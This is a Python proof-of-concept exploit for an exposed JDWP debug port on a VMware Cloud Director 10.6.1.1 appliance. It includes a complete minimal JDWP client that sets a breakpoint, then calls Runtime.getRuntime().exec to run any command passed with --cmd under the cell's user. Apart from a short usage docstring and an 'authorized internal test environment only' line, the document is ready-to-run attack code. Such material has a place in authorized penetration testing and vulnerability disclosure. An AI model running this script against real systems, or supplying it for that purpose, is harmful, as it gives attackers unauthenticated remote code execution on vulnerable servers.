#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PoC: VMware Cloud Director 10.6.1.1 appliance — unauthenticated JDWP (port 5005) -> RCE
     (runs as the vCD cell user, e.g. uid=1003(vcloud))

Authorized internal test environment only.

Chain:
  1) TCP to <target>:5005  (JDWP bound to *:5005; no authentication)
  2) JDWP handshake "JDWP-Handshake"
  3) Set a breakpoint on an already-loaded hot method (java.util.HashMap.get)
     with suspendPolicy = SUSPEND_EVENTTHREAD (1)  -> only the event thread is
     suspended, so InvokeMethod can run without freezing the whole VM.
     (SUSPEND_ALL deadlocks the invoke on this JVM.)
  4) On the Composite breakpoint event take the event thread id
  5) ClassType.InvokeMethod       -> java.lang.Runtime.getRuntime()
  6) ObjectReference.InvokeMethod -> Runtime.exec(String)
  7) Resume; the executed command runs with the privileges of the JVM user.

Note: JDWP object ids are invalidated once the target thread object is
collected, so the thread id must come from a live event (not from AllThreads).

Usage:
  python3 poc_jdwp_rce.py <target_ip> [port] [--cmd "<command>"]
Example:
  python3 poc_jdwp_rce.py 192.168.98.x 5005 \
      --cmd "/bin/sh -c id>/tmp/jdwp_poc.txt"
"""
import socket
import struct
import sys
import time

# --------------------------------------------------------------------------- #
# Minimal JDWP client (Python 3)
# --------------------------------------------------------------------------- #
TAG_OBJECT = 0x4c   # 'L'
TAG_STRING = 0x73   # 's'
SUSPEND_EVENTTHREAD = 1
EVENT_BREAKPOINT = 2


class JDWP:
    def __init__(self, host, port=8000, timeout=20):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.sendall(b"JDWP-Handshake")
        if self._recv_exact(14) != b"JDWP-Handshake":
            raise Exception("handshake failed (not a JDWP endpoint?)")
        self.id = 1
        f, m, o, r, fr = struct.unpack(">IIIII", self.cmd(1, 7))   # VirtualMachine.IDSizes
        self.fieldIDSize, self.methodIDSize, self.objIDSize = f, m, o
        self.refIDSize, self.frameIDSize = r, fr

    # ---- wire ----
    def _recv_exact(self, n):
        b = b""
        while len(b) < n:
            c = self.s.recv(n - len(b))
            if not c:
                raise Exception("socket closed")
            b += c
        return b

    def _read_packet(self):
        hdr = self._recv_exact(11)
        length, rid, flags, b9, b10 = struct.unpack(">IIBBB", hdr)
        body = self._recv_exact(length - 11) if length > 11 else b""
        is_event = (b9 == 0x40 and b10 == 100)      # Event / Composite
        err = (b9 << 8) | b10
        return is_event, err, body

    def cmd(self, cs, c, data=b""):
        self.s.sendall(struct.pack(">IIBBB", 11 + len(data), self.id, 0x00, cs, c) + data)
        self.id = (self.id + 2) & 0x7fffffff
        while True:
            is_event, err, body = self._read_packet()
            if is_event:
                continue
            if err:
                raise Exception("JDWP error %d (cmdset=%d cmd=%d)" % (err, cs, c))
            return body

    def wait_event(self, timeout=40):
        t0 = time.time()
        while time.time() - t0 < timeout:
            is_event, err, body = self._read_packet()
            if is_event:
                return body
        raise Exception("no JDWP event within %ss" % timeout)

    # ---- encoders ----
    def _string(self, s):
        if isinstance(s, str):
            s = s.encode()
        return struct.pack(">I", len(s)) + s

    def _read_string(self, b, off):
        n = struct.unpack(">I", b[off:off + 4])[0]
        return b[off + 4:off + 4 + n].decode("utf-8", "replace"), off + 4 + n

    # ---- commands ----
    def version(self):
        b = self.cmd(1, 1)
        desc, o = self._read_string(b, 0)
        maj = struct.unpack(">I", b[o:o + 4])[0]
        mino = struct.unpack(">I", b[o + 4:o + 8])[0]
        o += 8
        vmver, o = self._read_string(b, o)
        vmname, o = self._read_string(b, o)
        return desc, maj, mino, vmver, vmname

    def classes_by_signature(self, sig):
        b = self.cmd(1, 2, self._string(sig))
        n = struct.unpack(">I", b[:4])[0]
        off, out = 4, []
        for _ in range(n):
            off += 1
            out.append(int.from_bytes(b[off:off + self.refIDSize], "big"))
            off += self.refIDSize + 4
        return out

    def methods(self, rid):
        b = self.cmd(2, 5, rid.to_bytes(self.refIDSize, "big"))
        n = struct.unpack(">I", b[:4])[0]
        off, out = 4, []
        for _ in range(n):
            mid = int.from_bytes(b[off:off + self.methodIDSize], "big"); off += self.methodIDSize
            name, off = self._read_string(b, off)
            sig, off = self._read_string(b, off)
            off += 4
            out.append((mid, name, sig))
        return out

    def create_string(self, s):
        return int.from_bytes(self.cmd(1, 11, self._string(s)), "big")

    def set_breakpoint(self, rid, mid, policy=SUSPEND_EVENTTHREAD, code_index=0):
        loc = bytes([1]) + rid.to_bytes(self.refIDSize, "big") \
            + mid.to_bytes(self.methodIDSize, "big") + code_index.to_bytes(8, "big")
        mod = bytes([7]) + loc                                       # MODKIND_LOCATIONONLY
        data = bytes([EVENT_BREAKPOINT, policy]) + struct.pack(">I", 1) + mod
        return struct.unpack(">I", self.cmd(15, 1, data))[0]         # EventRequest.Set

    def clear_event(self, evkind, reqid):
        self.cmd(15, 2, bytes([evkind]) + struct.pack(">I", reqid))

    def parse_breakpoint_event(self, body):
        cnt = struct.unpack(">I", body[1:5])[0]
        off = 5
        for _ in range(cnt):
            kind = body[off]; off += 1
            reqid = struct.unpack(">I", body[off:off + 4])[0]; off += 4
            if kind == EVENT_BREAKPOINT:
                tid = int.from_bytes(body[off:off + self.objIDSize], "big")
                return reqid, tid
            break
        return None, None

    def invoke_static(self, classid, tid, mid, args=b"", options=0):
        data = classid.to_bytes(self.refIDSize, "big") + tid.to_bytes(self.objIDSize, "big") \
            + mid.to_bytes(self.methodIDSize, "big") + struct.pack(">I", len(args)) + args \
            + struct.pack(">I", options)
        return self.cmd(3, 3, data)                                   # ClassType.InvokeMethod

    def invoke_obj(self, objid, tid, classid, mid, args=b"", options=0):
        data = objid.to_bytes(self.objIDSize, "big") + tid.to_bytes(self.objIDSize, "big") \
            + classid.to_bytes(self.refIDSize, "big") + mid.to_bytes(self.methodIDSize, "big") \
            + struct.pack(">I", len(args)) + args + struct.pack(">I", options)
        return self.cmd(9, 6, data)                                   # ObjectReference.InvokeMethod

    def resume_vm(self):
        self.cmd(1, 9)


# --------------------------------------------------------------------------- #
# Exploit
# --------------------------------------------------------------------------- #
def _find(ms, name, sig):
    for mid, n, s in ms:
        if n == name and s == sig:
            return mid
    return None


def main():
    if len(sys.argv) < 2:
        print(__doc__)
        return 2
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 and not sys.argv[2].startswith("--") else 5005
    cmd = "/bin/sh -c id>/tmp/jdwp_poc.txt"
    if "--cmd" in sys.argv:
        cmd = sys.argv[sys.argv.index("--cmd") + 1]

    j = JDWP(host, port, timeout=60)
    desc, maj, mino, vmver, vmname = j.version()
    print("[+] JDWP reachable without authentication: %s %s (JDWP %d.%d)" % (vmname, vmver, maj, mino))

    rc = j.classes_by_signature("Ljava/lang/Runtime;")[0]
    rms = j.methods(rc)
    gr = _find(rms, "getRuntime", "()Ljava/lang/Runtime;")
    ex = _find(rms, "exec", "(Ljava/lang/String;)Ljava/lang/Process;")
    print("[+] Runtime=%#x getRuntime=%#x exec(String)=%#x" % (rc, gr, ex))

    # pick an already-loaded hot method to break on
    bp = None
    for scls, mname, msig in (("Ljava/util/HashMap;", "get", "(Ljava/lang/Object;)Ljava/lang/Object;"),
                              ("Ljava/lang/String;", "length", "()I"),
                              ("Ljava/util/ArrayList;", "size", "()I")):
        ids = j.classes_by_signature(scls)
        if not ids:
            continue
        mid = _find(j.methods(ids[0]), mname, msig)
        if mid:
            bp = (scls, ids[0], mid)
            break
    if not bp:
        print("[-] no usable breakpoint target")
        return 1
    scls, cid, mid = bp
    print("[+] breakpoint on %s (SUSPEND_EVENTTHREAD)" % scls)

    reqid = j.set_breakpoint(cid, mid)
    body = j.wait_event(timeout=40)
    rid_ev, tid = j.parse_breakpoint_event(body)
    print("[+] breakpoint hit: requestID=%d thread=%#x" % (rid_ev, tid))
    try:
        j.clear_event(EVENT_BREAKPOINT, reqid)
        cmd_obj = j.create_string(cmd)
        b = j.invoke_static(rc, tid, gr)                       # Runtime.getRuntime()
        if not b or b[0] != TAG_OBJECT:
            print("[-] getRuntime reply=%r" % (b[:16],)); return 1
        rt = int.from_bytes(b[1:1 + j.objIDSize], "big")
        arg = bytes([TAG_STRING]) + cmd_obj.to_bytes(j.objIDSize, "big")
        b2 = j.invoke_obj(rt, tid, rc, ex, arg)                # Runtime.exec(cmd)
        if not b2 or b2[0] != TAG_OBJECT:
            print("[-] exec reply=%r" % (b2[:24],)); return 1
        proc = int.from_bytes(b2[1:1 + j.objIDSize], "big")
        print("[+] RCE: %r  -> Runtime=%#x Process=%#x" % (cmd, rt, proc))
        print("[+] command executed with the privileges of the JVM user")
        return 0
    finally:
        try:
            j.resume_vm()
            print("[+] VM resumed")
        except Exception as e:
            print("[!] resume_vm failed: %s" % e)
        try:
            j.s.close()
        except Exception:
            pass


if __name__ == "__main__":
    sys.exit(main())
